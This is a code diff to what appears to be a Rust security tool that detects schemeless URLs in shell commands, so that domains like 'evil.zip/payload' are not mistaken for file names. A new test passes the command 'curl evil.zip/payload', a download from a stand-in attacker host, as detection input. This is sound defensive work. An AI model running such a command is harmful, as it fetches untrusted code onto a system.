@@ -675,18 +675,22 @@ fn looks_like_schemeless_host(s: &str) -> bool {
         return false;
     }
     // Exclude args where the host part looks like a file (e.g., "install.sh")
-    // Only check the host part (before first /), not the full string with path
-    let file_exts = [
+    // BUT only when there is no path component — if there IS a path (contains '/'),
+    // the host part is likely a real domain even if its TLD overlaps a file extension
+    // (e.g., evil.zip/payload is a real domain, not a filename).
+    let host_lower = host_part.to_lowercase();
+    if !s.contains('/') {
+        let file_exts = [
         ".sh", ".py", ".rb", ".js", ".ts", ".go", ".rs", ".c", ".h", ".txt", ".md", ".json",
         ".yaml", ".yml", ".xml", ".html", ".css", ".tar.gz", ".tar.bz2", ".tar.xz", ".tgz", ".zip",
         ".gz", ".bz2", ".rpm", ".deb", ".pkg", ".dmg", ".exe", ".msi", ".dll", ".so", ".log",
         ".conf", ".cfg", ".ini", ".toml", ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".tiff",
         ".tif", ".pdf", ".csv", ".mp3", ".mp4", ".wav", ".avi", ".mkv", ".flac", ".ogg", ".webm",
         ".ttf", ".otf", ".woff", ".woff2", ".docx", ".xlsx", ".pptx", ".sqlite",
-    ];
-    let host_lower = host_part.to_lowercase();
-    if file_exts.iter().any(|ext| host_lower.ends_with(ext)) {
-        return false;
+        ];
+        if file_exts.iter().any(|ext| host_lower.ends_with(ext)) {
+            return false;
+        }
     }
     // Must have at least 2 labels (e.g., "example.com" not just "file.txt")
     let labels: Vec<&str> = host_part.split('.').collect();
@@ -1135,4 +1139,30 @@ mod tests {
     fn test_schemeless_png_no_slash_is_file() {
         assert!(!looks_like_schemeless_host("lenna.png"));
     }
+
+    #[test]
+    fn test_schemeless_tld_overlap_with_path_is_domain() {
+        assert!(looks_like_schemeless_host("evil.zip/payload"));
+        assert!(looks_like_schemeless_host("evil.sh/payload"));
+    }
+
+    #[test]
+    fn test_schemeless_tld_overlap_without_path_is_file() {
+        assert!(!looks_like_schemeless_host("lenna.zip"));
+        assert!(!looks_like_schemeless_host("script.sh"));
+    }
+
+    #[test]
+    fn test_schemeless_tld_overlap_sink_context_detected() {
+        let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            !schemeless.is_empty(),
+            "evil.zip/payload should be detected as schemeless URL in sink context"
+        );
+    }
+
 }
